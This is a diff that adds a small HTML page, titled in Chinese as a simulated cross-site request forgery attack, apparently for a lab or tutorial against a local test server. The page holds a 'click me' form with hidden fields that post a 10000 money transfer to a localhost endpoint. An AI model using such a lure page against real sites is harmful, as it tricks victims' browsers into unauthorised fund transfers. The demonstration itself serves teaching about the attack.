@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>模拟 跨站请求伪装 CSRF攻击</title>
+</head>
+<body>
+
+<center>
+    <h1>
+        模拟 跨站请求伪装 CSRF攻击
+    </h1>
+    <br>
+    <form action="http://localhost:8080/zhuan"
+          method="post">
+        <input name="name" type="hidden" value="blr"/>
+        <input name="money" type="hidden" value="10000">
+        <input type="submit" value="点我">
+    </form>
+</center>
+
+
+</body>
+</html>
